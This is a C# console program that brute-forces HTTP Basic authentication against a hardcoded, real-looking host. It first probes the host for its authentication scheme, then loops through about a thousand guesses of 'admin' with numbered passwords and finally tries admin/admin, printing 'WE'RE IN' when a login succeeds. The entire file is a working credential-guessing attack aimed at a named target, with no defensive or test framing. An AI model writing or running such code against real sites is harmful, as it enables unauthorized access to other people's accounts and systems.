using System.Net;
using System.Net.Http.Headers;
using System.Text;

namespace BruteForce.Application
{
    public class Program
    {
        public static async Task Main(string[] args)
        {
            string url = "http://luxpdu.samayas.eu";


            await DetectAuthenticationAsync(url);

            await BruteForceAsync(url);
        }

        private static async Task DetectAuthenticationAsync(string url)
        {
            Console.WriteLine("Brute Force - Detect Auth");

            HttpClientHandler handler = new HttpClientHandler
            {
                // Important to see any 302/401 responses directly
                AllowAutoRedirect = false
            };

            using (HttpClient client = new HttpClient(handler))
            {
                try
                {
                    HttpResponseMessage response = await client.GetAsync(url);

                    Console.WriteLine($"Brute Force - Status Code: {(int)response.StatusCode} {response.StatusCode}");

                    // Print headers to see if auth type is revealed
                    if (response.Headers.WwwAuthenticate != null)
                    {
                        foreach (var header in response.Headers.WwwAuthenticate)
                        {
                            Console.WriteLine($"Brute Force - Auth type hinted: {header.Scheme} - {header.Parameter}");                           
                        }
                    }
                    else
                    {
                        Console.WriteLine("Brute Force - No WWW-Authenticate header found.");
                    }

                    // Optionally print content
                    string body = await response.Content.ReadAsStringAsync();
                    Console.WriteLine("Brute Force - Response body preview:\n\t" + body.Substring(0, Math.Min(500, body.Length)));
                }
                catch (HttpRequestException e)
                {
                    Console.WriteLine("Brute Force - Request error: " + e.Message);
                }
            }
        }

        private static async Task BruteForceAsync(string url)
        {
            int maxForce = 1000;
            Console.WriteLine($"Brute Force - Start for {maxForce}");

            // Failed
            for (int count = 1; count < maxForce; count++)
            {
                var username = "admin";
                var password = $"admin{count}";
                var byteArray = Encoding.ASCII.GetBytes($"{username}:{password}");
                var base64Credentials = Convert.ToBase64String(byteArray);

                using (HttpClient client = new HttpClient(new HttpClientHandler { AllowAutoRedirect = false }))
                {
                    client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Basic", base64Credentials);
                    HttpResponseMessage authResponse = await client.GetAsync(url);

                    if (authResponse.StatusCode == HttpStatusCode.Unauthorized)
                    {
                        Console.WriteLine($"Brute Force - {count} - Status Code: {(int)authResponse.StatusCode} {authResponse.StatusCode}");
                    }
                    else
                    {
                        Console.WriteLine($"Brute Force - {count} - WE'RE IN: {username} & {password}");
                    }
                }
            }

            // Success
            {
                var username = "admin";
                var password = $"admin";
                var byteArray = Encoding.ASCII.GetBytes($"{username}:{password}");
                var base64Credentials = Convert.ToBase64String(byteArray);

                using (HttpClient client = new HttpClient(new HttpClientHandler { AllowAutoRedirect = false }))
                {
                    client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Basic", base64Credentials);
                    HttpResponseMessage authResponse = await client.GetAsync(url);

                    if (authResponse.StatusCode == HttpStatusCode.Unauthorized)
                    {
                        Console.WriteLine($"Brute Force - Failed - Status Code: {(int)authResponse.StatusCode} {authResponse.StatusCode}");
                    }
                    else
                    {
                        Console.WriteLine($"Brute Force - Success - WE'RE IN: {username} & {password}");
                    }
                }
            }

            Console.WriteLine("Brute Force - Done Trying");
        }
    }
}
